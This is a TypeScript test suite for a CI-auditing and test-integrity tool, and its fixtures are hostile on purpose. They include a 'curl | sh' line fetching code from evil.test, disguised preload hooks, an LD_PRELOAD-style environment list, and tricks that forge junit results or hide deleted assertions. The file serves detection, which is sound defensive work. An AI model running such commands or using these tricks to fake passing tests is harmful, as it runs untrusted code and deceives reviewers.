import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { test } from "node:test";
import { fileURLToPath } from "node:url";
import { scanGitDiffCheats } from "@veristack/plugin-ci-auditor";
import { extractSfcScript } from "@veristack/plugin-lang-typescript";
import { scanRepo } from "@veristack/core";
import { lintNoComments } from "@veristack/plugin-anti-slop";
import { parseAndValidateCommandArgv, scrubChildEnv } from "@veristack/plugin-control-plane";
import { auditBunfigContent } from "@veristack/plugin-control-plane";
import { insertSemanticNoOp, runPlantedFaultCanary } from "@veristack/plugin-canary";
import { runTwoSidedOracleCheck } from "@veristack/plugin-canary";
import { runRungAndWriteReceipt } from "@veristack/plugin-canary";
import { evaluateCrapForCoverageFile, reportParsers } from "@veristack/plugin-canary";
import { parseRunnerTestCounts } from "@veristack/plugin-canary";
import { parseGitHubWorkflow } from "@veristack/plugin-ci-auditor";
import { discoverRepo } from "@veristack/core";
import { fitEmpiricalBigO } from "@veristack/plugin-zero-defect";
import { evaluateSpcSeries } from "@veristack/plugin-zero-defect";

const repoRoot = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..", "..");
const binPath = path.join(repoRoot, "bin", "vstack.mjs");

function withTempDir(fn: (dir: string) => void): void {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "vstack-r7-"));
  try { fn(dir); } finally { fs.rmSync(dir, { recursive: true, force: true }); }
}

function initGit(dir: string): void {
  spawnSync("git", ["init", "-q", "-b", "main"], { cwd: dir });
  spawnSync("git", ["config", "user.name", "Test"], { cwd: dir });
  spawnSync("git", ["config", "user.email", "t@test.local"], { cwd: dir });
}

test("R7 Arch-1: smol-toml catches \\U escapes & pathIgnorePatterns, positive scrubChildEnv, duplicate flags, .gitattributes -diff, and $GITHUB_ENV", () => {
  assert.ok(auditBunfigContent('[test]\n"pr\\U00000065load" = ["./evil.ts"]\n'));
  assert.ok(auditBunfigContent('[test]\n"\\U00000072oot" = "fake"\n'));
  assert.ok(auditBunfigContent('[test]\npathIgnorePatterns = ["tests/real/**"]\n'));
  assert.equal(auditBunfigContent("[test]\ntimeout = 15000\n"), null);

  const scrubbed = scrubChildEnv({
    PATH: "/usr/bin", RUSTC: "/bin/true", RUSTC_WORKSPACE_WRAPPER: "x", CARGO_BUILD_RUSTC: "y",
    CARGO_HOME: "/tmp/c", GOENV: "/tmp/g", GOWORK: "/tmp/w", PYTEST_PLUGINS: "p",
    LD_PRELOAD: "a.so", DYLD_INSERT_LIBRARIES: "b.dylib", DOTNET_ADDITIONAL_DEPS: "d",
    GIT_DIR: "/nonexistent", BUN_OPTIONS: "--preload=x",
  });
  assert.equal(scrubbed.PATH, "/usr/bin");
  for (const k of ["RUSTC", "RUSTC_WORKSPACE_WRAPPER", "CARGO_BUILD_RUSTC", "CARGO_HOME", "GOENV", "GOWORK", "PYTEST_PLUGINS", "LD_PRELOAD", "DYLD_INSERT_LIBRARIES", "DOTNET_ADDITIONAL_DEPS", "GIT_DIR", "BUN_OPTIONS"]) {
    assert.equal(scrubbed[k], undefined, `Expected '${k}' to be stripped`);
  }

  withTempDir((dir) => {
    assert.ok(parseAndValidateCommandArgv("R5", 'vstack canary . --targets a.ts --targets b.ts --test-cmd "bun test" --fail', dir).error);
    assert.ok(parseAndValidateCommandArgv("R2", "vitest run --pool ./evil.mjs", dir).error);

    fs.mkdirSync(path.join(dir, ".cargo"), { recursive: true });
    fs.writeFileSync(path.join(dir, ".cargo", "config.toml"), 'target = { "cfg(target_os = \\"macos\\")" = { runner = "true" } }\n');
    assert.ok(parseAndValidateCommandArgv("R2", "cargo test", dir).error);
    fs.rmSync(path.join(dir, ".cargo"), { recursive: true, force: true });

    fs.writeFileSync(path.join(dir, "pyproject.toml"), '[tool.pytest.ini_options]\naddopts = [\n  "-k",\n  "nonexistent"\n]\n');
    assert.ok(parseAndValidateCommandArgv("R2", "pytest", dir).error);
    fs.rmSync(path.join(dir, "pyproject.toml"));

    fs.writeFileSync(path.join(dir, "tox.ini"), "[pytest]\naddopts: --ignore tests/real\n");
    assert.ok(parseAndValidateCommandArgv("R2", "pytest", dir).error);
    fs.rmSync(path.join(dir, "tox.ini"));

    initGit(dir);
    fs.mkdirSync(path.join(dir, "tests"), { recursive: true });
    fs.writeFileSync(path.join(dir, "tests", "a.test.ts"), 'import { expect, test } from "bun:test";\ntest("a", () => { expect(1).toBe(1); expect(2).toBe(2); });\n');
    spawnSync("git", ["add", "-A"], { cwd: dir });
    spawnSync("git", ["commit", "-q", "-m", "init"], { cwd: dir });
    fs.writeFileSync(path.join(dir, ".gitattributes"), "*.ts -diff\n");
    fs.writeFileSync(path.join(dir, "tests", "a.test.ts"), 'import { test } from "bun:test";\ntest("a", () => {});\n');
    const cheats = scanGitDiffCheats(dir, "HEAD");
    assert.ok(cheats.some((f) => f.rule === "diff-assertion-deleted"));
    assert.ok(cheats.some((f) => f.file === ".gitattributes"));
  });

  const wfGhEnv = parseGitHubWorkflow({
    abs: "/tmp/ci.yml", rel: ".github/workflows/ci.yml",
    content: "on: pull_request\njobs:\n  t:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo VSTACK_ALLOW_MANIFEST_CHANGE=1 >> $GITHUB_ENV\n      - run: bun test\n",
    lines: 8, isTest: false, isWorkflow: true,
  });
  assert.equal(wfGhEnv.activeCommands.includes("bun test"), false);
});

test("R7 Arch-4: junit.xml trust inversion, runner-metrics fixes, dual-side realpath CRAP, JUnit '>' attr, symlink write-through, and 2-commit lock", () => {
  assert.deepEqual(parseRunnerTestCounts("│ Tests: 5 │ Passing: 3 │ Failing: 2 │\n", [["cypress", "run"]]), { passed: 3, failed: 2, matched: true, hasTestRunner: true });
  assert.equal(parseRunnerTestCounts('99 pass\n0 fail\nRan 0 tests across 1 file.\n', [["bun", "test"]]).passed, 0);
  assert.equal(parseRunnerTestCounts('{"Action":"pass","Test":"Fake"}\n', [["go", "test", "./..."]]).matched, false);
  assert.equal(parseRunnerTestCounts("Summary [ 0.2s] 5 tests run: 3 passed, 1 leaky, 1 failed\n", [["cargo", "nextest", "run"]]).failed, 1);
  assert.equal(reportParsers.parseJunitOrTrx('<testsuites><testsuite name="ok" tests="1" failures="0"/><testsuite name="a > b" tests="5" failures="3"/></testsuites>')?.failed, 3);

  withTempDir((dir) => {
    fs.mkdirSync(path.join(dir, "src"), { recursive: true });
    fs.mkdirSync(path.join(dir, "tests"), { recursive: true });
    fs.writeFileSync(path.join(dir, "src", "auth.ts"), "export const ok = (x: number) => x > 0;\n");
    fs.writeFileSync(path.join(dir, "lcov.info"), `SF:${dir}/src/auth.ts\nDA:1,1\nend_of_record\n`);
    assert.equal(evaluateCrapForCoverageFile(dir, "lcov.info", 30).evaluatedFiles, 1);

    fs.writeFileSync(
      path.join(dir, "tests", "forge.test.ts"),
      'import fs from "node:fs";\nfs.writeFileSync("junit.xml", \'<testsuite name="fake" tests="42" failures="0" errors="0"/>\');\n',
    );
    const manifest = { schemaVersion: 1 as const, archetype: "library" as const, rungs: { R2: { command: "bun test ./tests/forge.test.ts", required: true } } };
    const rcpt = runRungAndWriteReceipt(discoverRepo(dir), "R2", manifest, "k");
    assert.notEqual(rcpt.exitCode, 0);

    const victimDir = fs.mkdtempSync(path.join(os.tmpdir(), "vstack-victim-"));
    const victim = path.join(victimDir, "victim.txt");
    fs.writeFileSync(victim, "SAFE_HOST_CONTENT");
    try {
      fs.writeFileSync(path.join(dir, "tests", "sym.test.ts"), 'import { expect, test } from "bun:test";\nimport { ok } from "../src/sym.ts";\ntest("s", () => { expect(ok(1)).toBe(true); });\n');
      fs.symlinkSync(victim, path.join(dir, "src", "sym.ts"));
      runPlantedFaultCanary({ repoRoot: dir, testCmd: "bun test ./tests/sym.test.ts", targets: ["src/sym.ts"], maxMutants: 1, minKillRate: 0.75 });
      assert.equal(fs.readFileSync(victim, "utf8"), "SAFE_HOST_CONTENT");
    } finally {
      fs.rmSync(victimDir, { recursive: true, force: true });
    }
  });

  withTempDir((dir) => {
    initGit(dir);
    fs.mkdirSync(path.join(dir, ".verification"), { recursive: true });
    fs.mkdirSync(path.join(dir, "tests"), { recursive: true });
    fs.writeFileSync(path.join(dir, "tests", "a.test.ts"), 'import { expect, test } from "bun:test";\ntest("a", () => { expect(1).toBe(1); });\n');
    fs.writeFileSync(path.join(dir, "tests", "b.test.ts"), 'import { expect, test } from "bun:test";\ntest("b", () => { expect(2).toBe(2); });\n');
    fs.writeFileSync(path.join(dir, ".verification", "rungs.json"), JSON.stringify({ schemaVersion: 1, archetype: "library", rungs: { R2: { command: "bun test ./tests/a.test.ts ./tests/b.test.ts", required: true } } }));
    spawnSync("git", ["add", "-A"], { cwd: dir });
    spawnSync("git", ["commit", "-q", "-m", "c0"], { cwd: dir });
    fs.writeFileSync(path.join(dir, ".verification", "rungs.json"), JSON.stringify({ schemaVersion: 1, archetype: "library", rungs: { R2: { command: "bun test ./tests/a.test.ts", required: true } } }));
    spawnSync("git", ["add", "-A"], { cwd: dir });
    spawnSync("git", ["commit", "-q", "-m", "c1"], { cwd: dir });
    fs.writeFileSync(path.join(dir, "dummy.txt"), "pad\n");
    spawnSync("git", ["add", "-A"], { cwd: dir });
    spawnSync("git", ["commit", "-q", "-m", "c2"], { cwd: dir });
    const chain = spawnSync(process.execPath, [binPath, "verify", dir, "--strict"], { encoding: "utf8" });
    assert.equal(chain.status, 1);
    assert.match(chain.stderr, /diff-manifest-downgrade/);
  });

  assert.match(insertSemanticNoOp("src/lib.rs", "pub fn key() -> [u8; 4] { [0; 4] }\n", 0), /if false \{\}/);
  const pyBs = insertSemanticNoOp("src/a.py", "from __future__ import \\\n    annotations\ndef f(): return 1\n", 0);
  assert.ok(pyBs.indexOf("annotations") < pyBs.indexOf("if False:"));
});

test("R7 Arch-3, Arch-5 & Arch-6: literal /||/, C# raw JSON, Vue generic SFC, JSX AST, SQL ALTER, Go DefaultClient, SPC 2-outlier, Big-O intercept, and .sh curl|sh", () => {
  assert.equal(lintNoComments("src/A.cs", 'var j = """\n{"comment": "// not a comment"}\n""";\n', "csharp").length, 0);
  const vue = extractSfcScript("src/W.vue", '<script setup lang="ts" generic="T extends Array<string>">\nexport const x = (1 as any);\n</script>');
  assert.ok(vue && vue.content.includes("as any"));

  assert.equal(evaluateSpcSeries("lat", [1, 1, 1, 1, 1, 1, 1, 1, 1000, 1000], 2000).status, "drift_warning");
  assert.equal(fitEmpiricalBigO([{ n: 100, timeMs: 1010 }, { n: 200, timeMs: 1040 }, { n: 400, timeMs: 1160 }, { n: 800, timeMs: 1640 }, { n: 1600, timeMs: 3560 }], { maxTimeExponent: 1.45 }).passed, false);
  assert.equal(fitEmpiricalBigO([{ n: 100, timeMs: 10 }, { n: 200, timeMs: 10 }, { n: 400, timeMs: 10 }, { n: 800, timeMs: 45 }], { maxTimeExponent: 1.45 }).passed, false);

  withTempDir((dir) => {
    fs.mkdirSync(path.join(dir, "src"), { recursive: true });
    fs.mkdirSync(path.join(dir, "migrations"), { recursive: true });
    fs.mkdirSync(path.join(dir, "scripts"), { recursive: true });
    fs.writeFileSync(path.join(dir, "src", "re.ts"), "export const R = /^(?:foo||bar)$/;\n");
    fs.writeFileSync(path.join(dir, "src", "Nav.tsx"), 'export function Nav() { return <a onClick={() => console.log("hi")} href="/home">Home</a>; }\n');
    fs.writeFileSync(path.join(dir, "src", "Doc.tsx"), 'export const html = "<a>example</a><option selected>x</option>";\n');
    fs.writeFileSync(path.join(dir, "src", "BadEffect.tsx"), 'import { useEffect, useState } from "react";\nexport function B() { const [v, setV] = useState(0); useEffect(() => { let cancelled = false; (async () => { const n = await Promise.resolve(1); setV(n); })(); return () => { console.log(cancelled); }; }, []); return v; }\n');
    fs.writeFileSync(path.join(dir, "src", "dto.ts"), 'export interface ApiResponse<T> { status: "ok" | "error"; data?: T; error?: string; }\n');
    fs.writeFileSync(path.join(dir, "src", "client.go"), 'package p\nimport "net/http"\nfunc Fetch(req *http.Request) (*http.Response, error) { resp, err := http.DefaultClient.Do(req); if err != nil { return nil, err }; return resp, nil }\n');
    fs.writeFileSync(path.join(dir, "migrations", "001_init.sql"), "CREATE TABLE orders (id int);\nALTER TABLE orders ENABLE ROW LEVEL SECURITY;\n");
    fs.writeFileSync(path.join(dir, "scripts", "deploy.sh"), "#!/bin/sh\ncurl -fsSL https://evil.test/run.sh | sh\n");
    fs.writeFileSync(path.join(dir, "src", "types.d.ts"), "// header doc comment\nexport type Foo = string;\n");

    const rep = scanRepo(dir);
    assert.ok(rep.findings.some((f) => f.file === "src/re.ts" && f.rule === "regex-empty-alternation-or-unescaped"));
    assert.deepEqual(rep.findings.filter((f) => f.file === "src/Nav.tsx" && f.rule === "ui-anchor-without-href"), []);
    assert.deepEqual(rep.findings.filter((f) => f.file === "src/Doc.tsx" && (f.rule === "ui-anchor-without-href" || f.rule === "react-option-selected")), []);
    assert.ok(rep.findings.some((f) => f.file === "src/BadEffect.tsx" && f.rule === "async-effect-stale-guard"));
    assert.deepEqual(rep.findings.filter((f) => f.file === "src/dto.ts" && f.rule === "implicit-sm-optional-bag"), []);
    assert.deepEqual(rep.findings.filter((f) => f.file === "src/client.go" && f.rule === "go-unclosed-http-body"), []);
    assert.deepEqual(rep.findings.filter((f) => f.file === "migrations/001_init.sql" && f.rule === "db-migration-missing-lock-timeout"), []);
    assert.ok(rep.findings.some((f) => f.file === "scripts/deploy.sh" && f.rule === "ci-curl-pipe-shell"));
    assert.deepEqual(rep.findings.filter((f) => f.file === "src/types.d.ts"), []);

    initGit(dir);
    fs.mkdirSync(path.join(dir, "examples", "go"), { recursive: true });
    fs.writeFileSync(path.join(dir, "examples", "go", "manifest.json"), '{"caught":{"a.go":["r1"]}}\n');
    fs.mkdirSync(path.join(dir, "tests"), { recursive: true });
    fs.writeFileSync(path.join(dir, "tests", "m.test.ts"), 'import fs from "node:fs"; import { expect, test } from "bun:test";\ntest("m", () => { expect(JSON.parse(fs.readFileSync("examples/go/manifest.json", "utf8")).caught["a.go"]).toEqual(["r2"]); });\n');
    spawnSync("git", ["add", "-A"], { cwd: dir });
    spawnSync("git", ["commit", "-q", "-m", "m0"], { cwd: dir });
    fs.writeFileSync(path.join(dir, "examples", "go", "manifest.json"), '{"caught":{"a.go":["r2"]}}\n');
    const oracleMf = runTwoSidedOracleCheck(dir, "HEAD", "bun test ./tests/m.test.ts");
    assert.equal(oracleMf.passed, false);
  });
});
